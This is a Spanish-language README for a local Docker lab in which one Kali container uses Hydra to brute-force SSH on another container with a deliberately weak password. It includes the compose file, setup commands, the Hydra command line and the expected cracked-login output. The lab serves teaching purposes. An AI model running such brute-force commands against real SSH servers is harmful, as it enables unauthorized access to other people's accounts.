# Laboratorio de Fuerza Bruta con Hydra sobre SSH usando Docker Compose

Este proyecto implementa un entorno de laboratorio local utilizando Docker y Docker Compose para realizar un ataque de fuerza bruta con **Hydra** sobre un servicio SSH. Se emplean dos contenedores basados en Kali Linux: uno como atacante y otro como víctima.

---

## 📦 Estructura del proyecto

```
lab-hydra/
├── docker-compose.yml
├── pass.txt
├── .gitignore
└── README.md
```

---

## ⚙️ Requisitos previos

* Docker
* Docker Compose
* Git (opcional para subir el proyecto)

---

## 🧱 Paso 1: Crear el entorno

### 1.1 Clonar o crear la carpeta del laboratorio

```bash
mkdir lab-hydra && cd lab-hydra
```

### 1.2 Crear el archivo `docker-compose.yml`

```yaml
version: '3.8'

services:
  kali_attacker:
    image: kalilinux/kali-rolling
    container_name: kali_attacker
    stdin_open: true
    tty: true
    networks:
      - red_kali
    command: sleep infinity

  kali_victim:
    image: kalilinux/kali-rolling
    container_name: kali_victim
    stdin_open: true
    tty: true
    networks:
      - red_kali
    command: sleep infinity

networks:
  red_kali:
    driver: bridge
```

### 1.3 Levantar los contenedores

```bash
docker compose up -d
```

---

## 🧪 Paso 2: Configurar la máquina víctima

### 2.1 Ingresar al contenedor

```bash
docker exec -it kali_victim bash
```

### 2.2 Instalar y configurar SSH

```bash
apt update && apt install openssh-server -y
service ssh start
```

### 2.3 Crear un usuario vulnerable

```bash
useradd -m usuarioPrueba
passwd usuarioPrueba  # Usar "soyunavistima"
```

### 2.4 Confirmar IP

```bash
apt install iproute2 -y
ip a  # Anotar IP, por ejemplo: 172.20.0.3
```

---

## 💣 Paso 3: Configurar la máquina atacante

### 3.1 Ingresar al contenedor

```bash
docker exec -it kali_attacker bash
```

### 3.2 Instalar Hydra y cliente SSH

```bash
apt update
apt install hydra openssh-client dos2unix -y
```

### 3.3 Crear diccionario de contraseñas

```bash
echo "soyunavistima" > pass.txt
dos2unix pass.txt
```

---

## 🎯 Paso 4: Ejecutar el ataque

### 4.1 Lanzar Hydra

```bash
hydra -V -l usuarioPrueba -P pass.txt ssh://172.20.0.3
```

### 4.2 Resultado esperado

```text
[22][ssh] host: 172.20.0.3   login: usuarioPrueba   password: soyunavistima
```

---

## 🧾 Observaciones

* Asegúrate de que `pass.txt` tenga formato Unix.
* Si el login manual funciona pero Hydra falla, verifica los permisos y formato del archivo.
* `hydra -V` permite ver los intentos en tiempo real.

---

## 📤 Subir a GitHub

```bash
git init
git add .
git commit -m "Laboratorio fuerza bruta con Hydra sobre SSH"
git branch -M main
git remote add origin https://github.com/tuusuario/lab-hydra.git
git push -u origin main
```

---

## 📄 .gitignore sugerido

Crea un archivo llamado `.gitignore` y agrega lo siguiente:

```
# Archivos temporales y logs
*.log
*.out

# Archivos sensibles o temporales
pass.txt

# Archivos de sistema
.DS_Store
Thumbs.db

# Docker
*.pid
*.sock

# WSL/VSCode
.vscode/
```

---

## ✅ Créditos

FreezeDaniel, 2025
Hydra por van Hauser/THC

---

¿Preguntas o mejoras? ¡Abre un issue o pull request!
